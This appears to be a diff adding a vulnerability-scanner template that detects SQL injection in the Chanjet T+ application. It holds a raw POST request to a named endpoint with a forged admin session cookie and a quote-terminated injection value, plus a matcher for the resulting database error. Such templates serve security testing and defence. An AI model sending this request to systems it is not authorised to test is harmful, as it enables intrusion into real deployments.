@@ -1,0 +1,24 @@
+id: chanjet_t_plus-sql_injection-CT-753949
+info:
+  name: Chanjet T+ SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a potential SQL injection vulnerability in the Chanjet T+ application by exploiting specific request parameters.
+variables:
+  rand: "{{rand_int(5, 10)}}"
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Cookie: ASP.NET_SessionId=; sid=admin
+
+        {"accNum": "{{rand}}'", "functionTag": "SYS0104", "url": ""}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "order by begintime"
